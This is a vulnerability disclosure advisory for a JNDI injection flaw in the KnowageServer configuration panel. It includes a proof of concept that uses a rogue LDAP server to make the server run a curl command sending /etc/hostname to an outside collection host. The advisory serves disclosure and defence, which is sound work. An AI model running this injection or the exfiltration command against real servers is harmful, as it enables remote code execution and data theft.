## Overview
KNOWAGE is the open source analytics and business intelligence suite that allows you to combine traditional data and big/cloud data sources into valuable and meaningful information.

## Description
**KnowageServer, up to version **8.1**, does not properly validate user input for the “jndi” field in the “data sources” configuration panel. This behavior allows any user with role type “Administrator” (“roleTypeID”:28) to change the JNDI source at will by inserting a potentially malicious one, which could lead to remote code execution.**

JNDI injection is a type of attack that occurs when an attacker is able to inject malicious data into the JNDI data source used by an application, allowing them to execute arbitrary code on the application server. Proper validation and sanitization of user input can prevent this type of attack by ensuring that only safe data is used in JNDI queries.

## PoC
The following PoC demonstrates how Remote Code Execution within the Knowage server can be achieved thanks to this vulnerability: Leveraging a malicious LDAP server will be conveyed the command `curl -d @/etc/hostname http://<redacted>.oastify.com` to exfiltrate the /etc/hostname file to a third http exfiltration server.

The attack process begins with the preparation of an LDAP server, which, upon receiving a request for an object (in our case “o=exploit”), responds with a Reference Ref object containing the command `curl -d @/etc/hostname http://<redacted>.oastify.com`. 
To perform this operation, this PoC uses **Rogue JNDI**, a malicious server developed by Veracode Research.

After starting the LDAP server, we edit the data source using the UI. The address of the malicious server is entered into the JNDI field as shown in the figures below. 
By clicking “TEST” on the UI the input is processed and the attack is launched.

<img width="610" alt="Evidence1" src="https://github.com/user-attachments/assets/435724f3-8677-4078-b8c2-8e818592b009">

<img width="760" alt="Evidence2" src="https://github.com/user-attachments/assets/40c8bbba-e7e0-4cea-b7fb-206d00c4338c">

By inspecting the log of the attacking server, it can be seen that the attack was launched.

![Evidence3](https://github.com/user-attachments/assets/dba1529e-dd8d-4562-980a-976875c04176)

Upon receiving the “o=exploit” object, the Knowage server executes the `curl -d @/etc/hostname http://<redacted>.oastify.com` command. 
By inspecting the log of the the exfiltration-server, it can be seen that the code execution was successful: the server received a POST request containing the /etc/hostname file.

<img width="326" alt="Evidence4" src="https://github.com/user-attachments/assets/9e549d15-b3dc-4f2f-ac83-477345c67430">

The correctness of the received hostname can be seen in the Knowage licensing page, as shown in the figures below.

<img width="757" alt="Evidence5" src="https://github.com/user-attachments/assets/6d1d6060-577e-490f-8822-496f0f13b316">

## Timeline
- **07-10-2024**: The vulnerability was found and privately disclosed to the vendor;
- **16-10-2024**: A fix was released in version 8.1 as per commit: https://github.com/KnowageLabs/Knowage-Server/commit/f7d0362f737e1b0db1cc9cc95b1236d62d83dd0c 
- 
